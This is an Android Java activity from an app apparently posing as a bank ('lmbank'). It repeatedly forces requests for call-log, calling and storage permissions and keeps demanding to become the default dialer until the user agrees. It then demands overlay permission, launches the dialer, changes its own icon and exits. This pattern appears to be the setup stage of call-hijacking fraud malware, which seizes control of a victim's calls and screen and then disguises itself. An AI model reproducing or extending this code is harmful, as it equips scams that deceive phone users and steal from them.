package com.example.lmbank.activity;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.telecom.TelecomManager;
import android.view.WindowManager;

import androidx.annotation.NonNull;

import com.example.lmbank.util.IconUtil;
import com.example.lmbank.util.ListUtil;

import java.util.ArrayList;
import java.util.List;


public class MainActivity extends Activity {

    private static final int REQUEST_PERMISSIONS = 1;
    private static final int PHONE_PERMISSIONS = 2;
    private static final int WINDOW_PERMISSIONS = 3;
    private static final String[] PERMISSIONS = {
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.INTERNET,
            Manifest.permission.READ_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // 设置窗口标志
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH);
        super.onCreate(savedInstanceState);
        checkAndRequestPermissions();
    }

    private void initWindow() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, WINDOW_PERMISSIONS);
    }

    private void checkAndRequestPermissions() {
        requestPermissions(PERMISSIONS, REQUEST_PERMISSIONS); // 检查并请求权限
    }

    private void initPermission() {//默认电话
        Intent intent = new Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER);
        intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, getPackageName());
        startActivityForResult(intent, PHONE_PERMISSIONS);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (permissions.length == 0 && grantResults.length == 0) {
            return;
        }
        if (requestCode == REQUEST_PERMISSIONS) {
            List<String> permissionList = new ArrayList<>();
            for (int i = 0; i < grantResults.length; i++) {
                String permission = permissions[i];
                int results = grantResults[i];
                if (results != PackageManager.PERMISSION_GRANTED) {
                    permissionList.add(permission);
                }
            }
            if (permissionList.size() == 0) {
                initPermission();//申请电话权限
            } else {
                requestPermissions(ListUtil.toArray(permissionList), REQUEST_PERMISSIONS);
            }
        }
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PHONE_PERMISSIONS && resultCode == RESULT_OK) {
            if (!Settings.canDrawOverlays(this)) {
                initWindow();
            } else {
                Intent intent = new Intent(Intent.ACTION_CALL_BUTTON);
                startActivity(intent);
                IconUtil.chaneIcon(this);
                finish();
            }
        } else if (requestCode == PHONE_PERMISSIONS) {
            initPermission();
        } else if (requestCode == WINDOW_PERMISSIONS && Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Intent.ACTION_CALL_BUTTON);
            startActivity(intent);
            IconUtil.chaneIcon(this);
            finish();
        } else {
            initWindow();
        }
    }

}

